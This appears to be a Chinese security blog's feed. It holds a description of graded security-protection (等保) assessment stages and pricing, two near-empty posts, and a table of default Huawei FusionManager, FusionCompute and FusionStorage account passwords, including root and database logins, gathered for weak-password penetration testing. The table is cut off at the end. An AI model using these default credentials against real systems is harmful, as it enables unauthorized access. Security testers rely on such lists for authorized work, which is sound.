信息安全等级保护服务流程及内容</h1><p>信息安全等级保护服务分为定级<strong>备案咨询</strong>、<strong>安全建设规划</strong>、<strong>安全等级现状测评</strong>、<strong>信息系统安全整改咨询</strong>和<strong>信息安全等级测评</strong>五个阶段，各阶段工作内容如下：</p><ol><li><p>定级备案咨询阶段：通过定级对象分析、定级要素分析，初步确定系统保护等级，协助召开定级专家咨询会议，确定系统保护等级，协助撰写定级报告、协助联络公安机关，完成定级备案工作。</p></li><li><p>安全建设规划阶段：协助建设单位按照同步规划、同步建设、同步运行的原则，做好项目建设的安全规划。</p></li><li><p>安全等级现状测评阶段：详实调研业务系统，了解系统边界、功能、服务范围、涉及部门、重要程度，全面进行差距分析和脆弱性评估；找出不足之处和安全漏洞，为等级保护体系设计提供客观依据；将根据之前的项目成果，制定合理安全管理措施和技术措施，形成等级化的信息安全保障体系。</p></li><li><p>信息系统安全整改咨询阶段：依据脆弱性评估结果，弥补技术层面的安全漏洞；建立健全信息安全管理制度；根据前期信息安全保障体系设计方案，指导系统运维方落实相关安全保障措施。</p></li><li><p>信息安全等级测评阶段：实施等级测评，以满足国家信息安全监管的相关政策要求。</p></li></ol><p>等保服务在合同签订后1个月内完成项目的系统定级、安全建设规划。在系统建设完成后2周内完成安全评估差距分析、整改建议等工作。在系统整改完成后2周内完成信息安全等级测评工作，出具等保测评报告。</p><h1 id="0x02-定级备案咨询"><a href="#0x02-定级备案咨询" class="headerlink" title="0x02 定级备案咨询"></a>0x02 定级备案咨询</h1><h2 id="2-1-工作内容"><a href="#2-1-工作内容" class="headerlink" title="2.1 工作内容"></a>2.1 工作内容</h2><p>（1）系统梳理</p><p>网络拓扑调查：通过对系统网络拓扑结构的调查，确定各个网络安全域，分析网络拓扑结构安全。</p><p>资产信息调查：通过对资产信息的调查，确定系统中重要资产，比如服务器、核心交换机、边界防火墙、IDS等。</p><p>服务信息调查：通过对服务信息的调查，确定系统服务对象。</p><p>系统边界调查：通过对系统边界的调查，确定各子系统边界情况。</p><p>（2）定级对象分析</p><p>业务类型分析：通过对业务类型的分析，确定各系统的重要性。</p><p>管理机构分析：通对管理机构的分析，确定安全管理机构设置的合理性。</p><p>（3）定级要素分析</p><p>业务信息分析：通过以上调查与分析，明确业务信息（系统数据）被破坏后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>系统服务分析：通过以上调查与分析，明确系统被破坏或者中断服务后受侵害的客体（公民、法人和其他组织的合法权益，社会秩序、公共利益，国家安全）和侵害程度。</p><p>综合分析：通过对业务信息分析与系统服务分析，分别确定其安全等级确定等级：取业务信息安全等级与系统服务安全等级中最高的为整个系统安全等级。</p><p>（4）撰写定级报告</p><p>撰写定级报告：通过以上调查与分析，撰写系统定级报告，包括系统描述、业务信息安全保护等级的确定、系统服务安全保护等级的确定、整个系统安全保护等级的确定等。</p><p>（5）协助定级备案</p><p>协助填写备案表：协助业主完成系统安全等级保护备案表的填写。</p><p>协助评审审批：协助业主组织召开系统定级结果评审会，协助业主完成整个定级审批过程。</p><h2 id="2-2-交付成果"><a href="#2-2-交付成果" class="headerlink" title="2.2 交付成果"></a>2.2 交付成果</h2><p>信息系统安全等级保护定级报告</p><p>信息系统定级备案表</p><h1 id="0x03-安全建设规划"><a href="#0x03-安全建设规划" class="headerlink" title="0x03  安全建设规划"></a>0x03  安全建设规划</h1><h2 id="3-1-工作内容"><a href="#3-1-工作内容" class="headerlink" title="3.1 工作内容"></a>3.1 工作内容</h2><p>根据等级化安全保障体系的设计思路，等级保护的安全建设规划包括以下内容：</p><ol><li><p>安全域设计：根据系统定级情况，通过分析系统业务流程、功能模块，根据安全域划分原则设计系统安全域架构。通过安全域设计将系统分解为多个层次，为下一步安全保障体系框架设计提供基础框架。</p></li><li><p>确定安全域安全要求：参照国家相关等级保护安全要求，设计不同安全域的安全要求。通过安全域适用安全等级选择方法确定系统各区域等级，明确各安全域所需采用的安全指标。</p></li><li><p>安全保障体系方案设计：根据安全域框架，设计系统各个层次的安全保障体系框架以及具体方案。包括：各层次的安全保障体系框架形成系统整体的安全保障体系框架；物理安全、网络安全、服务器安全等安全技术设计，安全管理制度规划与设计。</p></li></ol><p>通过如上内容的规划，系统可以形成整体的等级化的安全保障体系，同时根据安全术建设和安全管理建设，保障系统整体的安全。</p><h2 id="3-2-交付成果"><a href="#3-2-交付成果" class="headerlink" title="3.2 交付成果"></a>3.2 交付成果</h2><p>信息系统安全等级保护建设规划方案</p><h1 id="0x04-安全等级现状测评"><a href="#0x04-安全等级现状测评" class="headerlink" title="0x04 安全等级现状测评"></a>0x04 安全等级现状测评</h1><p>为确保信息系统的安全保护措施符合相应安全等级的基本安全要求，需要实施安全等级现状测评，以提出合理、有效的安全整改建议，为信息系统制定信息安全规划和决策提供依据。</p><p>测评机构将指导系统运维方开展安全评估工作，简要了解系统现有安全保障措施与国家信息安全等级保护等级标准要求之间的差距，制定信息安全规划方案；同时检查系统在技术层面存在的脆弱性漏洞，为后续安全加固工作奠定基础。</p><h2 id="4-1-等级保护差距分析"><a href="#4-1-等级保护差距分析" class="headerlink" title="4.1 等级保护差距分析"></a>4.1 等级保护差距分析</h2><p>按照等级保护实施要求，信息系统应该具备相应等级的安全防护能力，部署相应的安全设备，制定相应的安全管理机构、制度、岗位等。</p><p>差距分析就是依据等级保护技术标准和管理规范，比较分析信息系统安全防护能力与等级要求之间的差距。为等级化体系设计提供依据。</p><h3 id="4-1-1-工作内容"><a href="#4-1-1-工作内容" class="headerlink" title="4.1.1 工作内容"></a>4.1.1 工作内容</h3><p>差距分析将从技术上的物理安全、网络安全、主机系统安全、应用安全和数据安全五个层面和管理上的安全管理机构、安全管理制度、人员安全管理、系统建设管理和系统运维管理等五个方面分别进行。具体内容为：</p><p>1、技术差距检测：</p><p>(1)物理安全：针对信息系统所处的物理环境即机房、线路、基础支撑设施等进行标准符合性识别。主要包含：物理位置选择、物理访问控制、防盗窃和防破</p><p>坏、防雷击、防火、防水和防潮、防静电、温湿度控制、电力供应、电磁防护等方面。</p><p>(2)网络安全：对评估工作范围内的网络与安全设备、网络架构进行网络安全符合性调查。主要包含：结构安全与网段划分、网络访问控制、网络安全审计、边界完整性检查、网络入侵防范、恶意代码防范、网络设备防护等方面。</p><p>(3)主机安全：评估信息系统的主机系统安全保障情况。主要包含：身份鉴别、访问控制、安全审计、系统保护、入侵防护、恶意代码防护、资源控制等方面。</p><p>(4)应用安全：对信息系统进行应用安全符合性调查。主要包含：身份鉴别、访问控制、安全审计、通信完整性、通信保密性、抗抵赖、软件容错、资源控制等方面。</p><p>(5)数据安全：评估信息系统的数据安全保障情况。主要检查系统的数据在采集、传输、处理和存储过程中的安全。</p><p>2、管理差距检测：</p><p>(1)安全管理制度:评估安全管理制度的制定、发布、评审和修订等情况。主要涉及安全主管人员、安全管理人员、各类其它人员、各类管理制度、各类操作规程文件等对象。</p><p>(2)安全管理机构:评估安全管理机构的组成情况和机构工作组织情况。主要涉及安全主管人员、安全管理人员、相关的文件资料和工作记录等对象。</p><p>(3)人员安全管理：评估机构人员安全控制方面的情况。主要涉及安全主管人员、人事管理人员、相关管理制度、相关工作记录等对象。</p><p>(4)系统建设管理：评估系统建设管理过程中的安全控制情况。主要涉及安全主管人员、系统建设负责人、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>(5)系统运维管理：评估系统运维管理过程中的安全控制情况。主要涉及安全主管人员、安全管理人员、各类运维人员、各类管理制度、操作规程文件、执行过程记录等对象。</p><p>3、等级保护差距分析：</p><p>基于技术、管理层面的标准合规性检测结果，根据国家等级保护标准，结合行业规范，针对标准的每项具体要求，从微观角度展开，深入分析信息系统与相应等级要求之间的差距，并从宏观角度对计算环境、区域边界和通信网络等方面对单元检测的结果进行验证、分析和整体评价，确认信息系统的整体安全防护能力有无缺失，是否能够对抗相应等级的安全威胁，为安全规划设计提供依据。</p><h3 id="4-1-2-交付成果"><a href="#4-1-2-交付成果" class="headerlink" title="4.1.2 交付成果"></a>4.1.2 交付成果</h3><p>信息系统等级保护差距分析报告</p><h2 id="4-2-脆弱性检测"><a href="#4-2-脆弱性检测" class="headerlink" title="4.2 脆弱性检测"></a>4.2 脆弱性检测</h2><p>脆弱性（弱点）是指可能为许多目的所利用的系统某些方面，包括系统弱点、安全漏洞和实现的缺陷等。为识别和分析信息系统所存在的脆弱性，确认需要实施安全加固与调优的事项，将首先进行脆弱性检测工作，从网络层、主机层和应用层三个方面进行检测，本次脆弱性检测的主要内容是漏洞扫描和系统配置检查。</p><h3 id="4-2-1-工作内容"><a href="#4-2-1-工作内容" class="headerlink" title="4.2.1 工作内容"></a>4.2.1 工作内容</h3><p>系统脆弱性检测涉及三个层面工作内容，包含整体的网络架构分析，服务器、网络与安全设备的配置检查，以及漏洞扫描检测工作。具体内容如下：</p><p>1、网络架构分析：</p><p>进行网络架构分析的目的是查找需要对网络结构实施优化的事项，具体内容如下：；(1)网络现状识别：涉及应用系统和用户分布，安全；(2)网络安全分析：从网络的整体架构进行考虑，紧急；如下：</p><p>(1)网络现状识别：涉及应用系统和用户分布，安全域划分，区域边界之间所采取的访问控制措施，网络带宽需求及现状，对数据流向的安全控制，设备链路冗余设计，对网络带宽的管控措施，远程访问通信链路的加密，各区域内所采取的入侵检测，安全审计措施，网络出口所采取的入侵防范、病毒过滤、垃圾邮件过滤措施、终端用户接入认证等内容。</p><p>(2)网络安全分析：从网络的整体架构进行考虑，紧密结合业务应用现状，识别重要信息系统部署和用户所在网络区域的分布情况，分析网络设计布局的合理性，是否存在单点隐患，确认链路带宽是否满足业务要求，检查产品设备老化问题，确认设备性能是否满足要求，分析网络区域边界是否定义清晰，安全域划分是否合理，服务器、终端接入是否安全，各类安全设备的部署是否到位等。</p><p>2、设备配置检查：</p><p>检查系统相关服务器、交换机与安全设备的配置策略，具体内容如下：</p><p>(1)服务器手工检查：检查服务器操作系统、数据库和中间件的开放服务及端口、账户设置、文件权限设置、审计、共享资源、补丁更新和病毒防护等情况；</p><p>(2)网络设备手工检查：检测交换机或路由器的Vlan划分、路由表配置、访问控制列表ACL、IP和MAC地址绑定情况、设备登录认证方式、口令设置等配置项；</p><p>(3)安全设备手工检查：获取防火墙的访问控制策略、以透明还是路由方式部署、NAT地址转换、网络连接数限制等信息，检查入侵检测、安全审计设备的审计策略配置、特征库版本情况等。</p><p>3、漏洞扫描检测：</p><p>借助专业化漏洞检测工具，对检测范围内的交换机、路由器和服务器实施扫描，发现配置上存在的弱点，作为对手工检查工作所获取数据的补充，同时也是制定安全加固方案的重要依据。</p><h3 id="4-2-2-交付成果"><a href="#4-2-2-交付成果" class="headerlink" title="4.2.2 交付成果"></a>4.2.2 交付成果</h3><p>信息系统脆弱性评估报告</p><h2 id="4-3-渗透测试"><a href="#4-3-渗透测试" class="headerlink" title="4.3 渗透测试"></a>4.3 渗透测试</h2><p>通过模拟黑客对信息系统进行渗透测试，发现分析并验证其存在的主机安全漏洞、敏感信息泄露、SQL注入漏洞、XSS跨站脚本漏洞及弱口令等安全隐患，评估系统抗攻击能力，提出安全加固建议。</p><h3 id="4-3-1-工作内容"><a href="#4-3-1-工作内容" class="headerlink" title="4.3.1 工作内容"></a>4.3.1 工作内容</h3><p>针对信息系统的渗透测试将采取两种类型：</p><p>第一类型：互联网渗透测试，是通过互联网发起远程攻击，比其他类型的渗透测试更能说明漏洞的严重性；</p><p>第二类型：内网渗透测试，通过接入内部网络发起内部攻击，主要针对信息系统的后台管理系统进行测试。</p><h3 id="4-3-2-交付成果"><a href="#4-3-2-交付成果" class="headerlink" title="4.3.2 交付成果"></a>4.3.2 交付成果</h3><p>信息系统渗透测试报告</p><h2 id="4-4-源代码测评"><a href="#4-4-源代码测评" class="headerlink" title="4.4 源代码测评"></a>4.4 源代码测评</h2><p>源代码安全测试对所提供的源代码采用工具进行安全扫描，分析和软件安全风险管理，并给出安全问题审计结果，安全问题描述和推荐修复建议。</p><h3 id="4-4-1-工作内容"><a href="#4-4-1-工作内容" class="headerlink" title="4.4.1 工作内容"></a>4.4.1 工作内容</h3><p>依据CVE（Common Vulnerabilities &amp; Exposures）安全漏洞库、设备及软件厂商公布的漏洞，根据测试用例对信息系统的源代码进行安全扫描，对安全漏洞进行识别，给出整改建议</p><h3 id="4-4-2-交付成果"><a href="#4-4-2-交付成果" class="headerlink" title="4.4.2 交付成果"></a>4.4.2 交付成果</h3><p>信息系统源代码测试报告</p><h1 id="0x05-信息系统安全整改咨询"><a href="#0x05-信息系统安全整改咨询" class="headerlink" title="0x05 信息系统安全整改咨询"></a>0x05 信息系统安全整改咨询</h1><p>信息系统安全整改包含3方面工作内容：首先测评机构将指导系统运维方针对脆弱性检测和渗透测试所发现的技术层面的安全隐患进行整改，其次以等级保护对应等级的管理要求为依据建立健全信息安全管理制度，最后依照信息系统安全规划方案指导信息系统优化和完善信息系统安全防护措施，并对系统安全整改情况进行跟踪和效果评价，为后续开展的等级测评工作奠定良好基础。</p><h2 id="5-1-安全加固与优化"><a href="#5-1-安全加固与优化" class="headerlink" title="5.1 安全加固与优化"></a>5.1 安全加固与优化</h2><p>根据前期脆弱性评估、渗透测试结果，结合信息系统的业务需求，对信息系统相关设备进行安全策略加强、调优等，加强网络、系统和设备抵御攻击和威胁的能力，整体提高网络安全防护水平。</p><h3 id="5-1-1-工作内容"><a href="#5-1-1-工作内容" class="headerlink" title="5.1.1 工作内容"></a>5.1.1 工作内容</h3><p>根据前期对信息系统进行的调研、评估与测评结果，以脆弱性评估报告和渗透测试报告为依据，根据网络安全特殊需求和业务流程制定安全加固方案，在不影响当前业务开展的前提下，对信息系统内的操作系统、数据库、安全设备以及中间件的安全配置策略进行加强，及时消除因安全漏洞被恶意攻击者利用从而引发的风险。</p><p>根据信息系统网络现状，本次项目安全加固对象分为四类，即信息系统内的操作系统、数据库、中间件以及网络与安全设备。</p><h3 id="5-1-2-交付成果"><a href="#5-1-2-交付成果" class="headerlink" title="5.1.2 交付成果"></a>5.1.2 交付成果</h3><p>信息系统安全加固与优化方案</p><h2 id="5-2-等级保护制度建设"><a href="#5-2-等级保护制度建设" class="headerlink" title="5.2 等级保护制度建设"></a>5.2 等级保护制度建设</h2><p> 以等级保护差距分析结果为依据，依照安全保障体系设计所提及的建设内容，按照等级保护标准要求，制定等级保护管理体系框架，明确管理方针、策略，以及相应的规定、操作规程、业务流程和记录表单；测评机构从结合信息系统实际业务流程的原则出发，指导系统运维方按照等级保护对应等级的管理标准，编写管理制度文件，并进行反复沟通和修订，确保所制定的文件的适用性，且满足各系统相应保护等级的安全管理要求。</p><h3 id="5-2-1-工作内容"><a href="#5-2-1-工作内容" class="headerlink" title="5.2.1 工作内容"></a>5.2.1 工作内容</h3><p>制定和完善与信息系统的安全保护等级相适应的配套管理制度，制度相关内容如下：</p><p>(1)安全管理机构：加强和完善安全机构的建设，设立指导和管理信息安全工作的信息安全领导小组，设立安全主管、安全管理各个方面的负责人，明确定义各个工作岗位的职责。建立各种安全管理活动的审批程序，明确对内对外的沟通协作方式，建立对各项安全管理活动的监督审核机制。</p><p>(2)安全管理制度：在差距分析的基础上，建立信息安全工作总体方针、安全策略，以方针策略为依据建立配套的安全管理制度及流程规范，由专门的组织机构负责管理制度的制订、发布和贯彻落实。定期对制度进行评审和修订，确保管理制度的适用性。</p><p>(3)人员安全管理：主要涉及两方面，对内部人员的安全管理和对外部人员的安全管理。具体包括人员录用、人员离岗、人员考核、安全意识教育和培训和外部人员访问管理等方面。</p><p>(4)系统建设管理：为了建设符合安全等级保护要求的信息系统、系统建设管理主要关注的是信息系统生命周期中的前三个阶段（即设计、采购、实施）中各</p><p>项安全管理活动，实现信息系统的安全管理贯穿系统的整个生命周期。系统建设管理分别从工程实施建设前、建设过程以及建设完毕交付等三方面考虑，具体包括系统定级、安全方案设计、产品采购和使用、自行软件开发、外包软件开发、工程实施、测试验收、系统交付、系统备案、等级测评和安全服务商选择等方面。</p><p>(5)系统运维管理：系统运行涉及到很多管理方面，要保证系统始终处于相应安全保护等级的安全状态中。要监控系统发生的重大变化，以便修改对应的安全措施。系统运维管理主要包括环境管理、资产管理、介质管理、设备管理、监控管理和安全管理中心、网络安全管理、系统安全管理、恶意代码防范管理、密码管理、变更管理、备份与恢复管理、安全事件处置、应急预案管理等方面。</p><h3 id="5-2-2-交付成果"><a href="#5-2-2-交付成果" class="headerlink" title="5.2.2 交付成果"></a>5.2.2 交付成果</h3><p>信息系统安全管理制度</p><h1 id="0x06-信息安全等级测评"><a href="#0x06-信息安全等级测评" class="headerlink" title="0x06 信息安全等级测评"></a>0x06 信息安全等级测评</h1><p>信息系统安全等级测评是测评机构依据国家信息安全等级保护制度规定，按照有关管理规范和技术标准，对非涉及国家秘密信息系统安全等级保护状况进行检测评估的活动。信息系统安全等级测评主要检测和评估信息系统在安全技术、安全管理等方面是否符合已确定的安全等级的要求；对于尚未符合要求的信息系统，分析和评估其潜在威胁、薄弱环节以及现有安全防护措施，综合考虑信息系统的重要性和面临的安全威胁等因素，提出相应的整改建议，并在系统整改后进行复测确认，以确保整改措施符合相应安全等级的基本要求。</p><h2 id="6-1-测评内容"><a href="#6-1-测评内容" class="headerlink" title="6.1 测评内容"></a>6.1 测评内容</h2><p>针对信息系统的安全等级测评的内容如下：</p><p>(1)按照《信息系统安全等级保护测评要求》，从以下方面进行等级测评：</p><p>技术安全测评：包括物理安全、网络安全、主机安全、数据安全、应用安全；</p><p>管理安全测评：包括安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理；</p><p>综合测评：包括安全控制间安全测评、层面间安全测评、区域间安全测评、系统结构安全测评。</p><p>(2)对每个保护类的子项给出测评结果并分别提出改进建议；</p><p>(3)按照整改结果进行复测，出具等级测评报告。</p><h2 id="6-2-交付成果"><a href="#6-2-交付成果" class="headerlink" title="6.2 交付成果"></a>6.2 交付成果</h2><p>信息系统等级测评报告</p><h1 id="0x07-信息安全等级保护服务报价"><a href="#0x07-信息安全等级保护服务报价" class="headerlink" title="0x07 信息安全等级保护服务报价"></a>0x07 信息安全等级保护服务报价</h1><p>等级保护按照运行的业务进行定级，不同业务可以定不同保护等级，根据基础网络、管理制度复用原则进行多个业务系统报价（三级、二级系统报价明细见附件）。</p><p>按照10个业务系统计算，进行定级备案、建设规划、安全测评、整改咨询、等级测评报告等5项服务，预估报价如下：</p><p>10个三级系统：</p><p>预估总价=34.78+9×3.55=66.73万元10个二级系统：</p><p>预估总价=20.77+9×2.1=39.67万元5个三级系统5个二级系统：</p><p>预估总价=34.78+4×3.55+5×2.1=59.48万元</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;随着等保2.0的到来，再一次掀起了网络安全的热潮，为了让大家更好的理解等级保护，决定整理此文，内容来自互联网搜集。&lt;/p&gt;
    
    </summary>
    
      <category term="安全服务" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"/>
    
      <category term="等级保护" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
    
      <category term="等级保护" scheme="https://www.mad-coding.cn/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://www.mad-coding.cn/2019/10/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://www.mad-coding.cn/2019/10/24/网络安全法/</id>
    <published>2019-10-24T02:04:37.000Z</published>
    <updated>2019-10-28T08:50:57.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>法律，是每个公民必须要遵守的准则，触犯法律的底线将受到法律的惩罚。随着2016年11月7日《中华人民共和国网络安全法》的发布，意味着每一个网络也不是法外之地，任何人都要遵守法律，不搞黑产，不入侵计算机，不盗窃用户的数据等等。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;法律，是每个公民必须要遵守的准则，触犯法律的底线将受到法律的惩罚。随着2016年11月7日《中华人民共和国网络安全法》的发布，意味着每一个网络也不是法外之地，任何人都要遵守法律，不搞黑产，不入侵计算机，不盗窃用户的数据等等。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="法律" scheme="https://www.mad-coding.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>漏洞案例大全</title>
    <link href="https://www.mad-coding.cn/2019/10/18/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E5%A4%A7%E5%85%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/18/漏洞案例大全/</id>
    <published>2019-10-18T09:01:05.000Z</published>
    <updated>2019-11-14T07:58:19.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>每天工作之余卡在微信公众号或者订阅的博客中看看别人写的文章，但是我相信肯定有人和我一样，看完文章以后的感觉</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/b1a663d5adb16eb9" class="lozad"></p><p>然后，就没有然后了，可能当时的确学习到了别人的思路或者想法，但是在短的时间内要吃透别人的文章是不可能的，所以这里作为自己的漏洞案例大全，将自己在渗透测试过程中或者看到好的文章中的一些漏洞的案例记录下来，在时间允许的情况下加以分类。方便自己，帮助他人，共勉~</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/816554f290b20da5" class="lozad"></p><a id="more"></a><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><h2 id="1-1-越权访问"><a href="#1-1-越权访问" class="headerlink" title="1.1 越权访问"></a>1.1 越权访问</h2><h3 id="1-1-1-Fuzz大法之挖掘潜的逻辑越权"><a href="#1-1-1-Fuzz大法之挖掘潜的逻辑越权" class="headerlink" title="1.1.1 Fuzz大法之挖掘潜的逻辑越权"></a>1.1.1 Fuzz大法之挖掘潜的逻辑越权</h3><h1 id="0x02-逻辑漏洞"><a href="#0x02-逻辑漏洞" class="headerlink" title="0x02 逻辑漏洞"></a>0x02 逻辑漏洞</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;每天工作之余卡在微信公众号或者订阅的博客中看看别人写的文章，但是我相信肯定有人和我一样，看完文章以后的感觉&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/b1a663d5adb16eb9&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后，就没有然后了，可能当时的确学习到了别人的思路或者想法，但是在短的时间内要吃透别人的文章是不可能的，所以这里作为自己的漏洞案例大全，将自己在渗透测试过程中或者看到好的文章中的一些漏洞的案例记录下来，在时间允许的情况下加以分类。方便自己，帮助他人，共勉~&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/816554f290b20da5&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://www.mad-coding.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞案例" scheme="https://www.mad-coding.cn/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>华为账户信息一览表</title>
    <link href="https://www.mad-coding.cn/2019/10/16/%E5%8D%8E%E4%B8%BA%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%E4%B8%80%E8%A7%88%E8%A1%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/16/华为账户信息一览表/</id>
    <published>2019-10-16T06:30:34.000Z</published>
    <updated>2019-12-02T06:21:39.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>弱口令是渗透测试中的一个非常常见也非常严重的一个漏洞，很多系统被入侵脱裤是从一个弱口令爆破成功开始的。这里记录一下华为设备的一些默认弱口令，为了方便以后自己查阅使用。</p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-1760dba9c1e181b0964c091e0af19e63.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-FusionManager"><a href="#0x01-FusionManager" class="headerlink" title="0x01 FusionManager"></a>0x01 FusionManager</h1><table><thead><tr><th>账户说明</th><th>默认账号</th></tr></thead><tbody><tr><td>FusionManager帐户</td><td>用户名：admin密码：Admin@123</td></tr><tr><td>FusionManager帐户<strong>说明：</strong>使用该帐户登录FusionManager并跳转到FusionCompute后，拥有FusionCompute系统的所有管理和维护权限。使用其余帐户跳转到FusionCompute后，只能查看数据和修改告警阈值。</td><td>用户名：geadmin密码：Admin@123</td></tr><tr><td>FusionManager节点操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用galaxmanager帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei@001</td></tr><tr><td>FusionManager节点操作系统帐户（业务帐户）</td><td>用户名：galaxmanager密码：GalaxManager_2012</td></tr><tr><td>FusionManager访问数据库的帐户</td><td>用户名：galaxmanager密码：GalaxManager7!</td></tr><tr><td>FusionManager数据库的帐户</td><td>用户名：cloudmgr密码：Manager@123</td></tr><tr><td>FusionManager数据库默认的系统帐户</td><td>用户名：sys密码：System@123</td></tr></tbody></table><h1 id="0x02-FusionCompute"><a href="#0x02-FusionCompute" class="headerlink" title="0x02 FusionCompute"></a>0x02 FusionCompute</h1><table><thead><tr><th>账号说明</th><th>默认账号</th></tr></thead><tbody><tr><td>主机的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei_123</td></tr><tr><td>主机的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>VRM节点的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：root</td></tr><tr><td>VRM节点的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionCompute访问数据库的帐户</td><td>用户名：galax密码：SingleLOUD!1</td></tr><tr><td>管理节点VNC登录帐户</td><td>用户名：root密码：GalaX088</td></tr></tbody></table><h1 id="0x03-FusionStorage"><a href="#0x03-FusionStorage" class="headerlink" title="0x03 FusionStorage"></a>0x03 FusionStorage</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage Manager节点操作系统帐户</td><td>用户名：root密码：UVP_2012lab</td></tr><tr><td>FusionStorage Manager节点操作系统的业务帐户</td><td>用户名：dsware密码：dsmHuawei@123</td></tr><tr><td>FusionStorage访问数据库的帐户</td><td>用户名：omm密码：ommHuawei@123</td></tr></tbody></table><h1 id="0x04-内部部件通讯账户"><a href="#0x04-内部部件通讯账户" class="headerlink" title="0x04  内部部件通讯账户"></a>0x04  内部部件通讯账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager对FusionCompute的内部通讯帐户</td><td>用户名：GERest密码：Rest@GE123</td></tr><tr><td>FusionCompute对FusionManager的内部通讯帐户</td><td>用户名：gmsysman密码：GMEnginE@123</td></tr><tr><td>FusionManager对FusionStorage的内部通讯帐户</td><td>用户名：OmmRest密码：Omm@1234</td></tr><tr><td>FusionStorage对FusionManager的内部通讯帐户</td><td>用户名：gmadmin密码：gmHuawei@123</td></tr><tr><td>FusionManager内部的通讯帐户</td><td>用户名：GmUhmRest密码：Rest@GmUhm123</td></tr><tr><td>FusionCompute内部的通讯帐户</td><td>用户名：gesysman密码：GeEnginE@123</td></tr></tbody></table><h2 id="FusionStorage对外提供的Rest接口帐户"><a href="#FusionStorage对外提供的Rest接口帐户" class="headerlink" 